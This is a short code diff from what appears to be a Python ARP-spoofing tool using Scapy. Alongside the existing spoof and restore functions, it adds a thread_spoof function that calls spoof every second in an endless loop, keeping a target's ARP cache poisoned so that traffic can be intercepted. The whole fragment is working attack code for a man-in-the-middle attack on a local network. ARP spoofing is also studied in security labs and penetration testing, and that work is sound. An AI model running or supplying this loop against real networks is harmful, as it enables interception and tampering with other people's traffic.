@@ -26,3 +26,9 @@ def spoof(target_ip, host_ip, target_mac):
 def restore(target_ip, host_ip, target_mac, gw_mac):
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=gw_mac)
     send(arp_response, verbose=0, count=7)
+
+
+def thread_spoof(target1, target2, target_mac):
+    while True:
+        spoof(target1, target2, target_mac)
+        time.sleep(1)
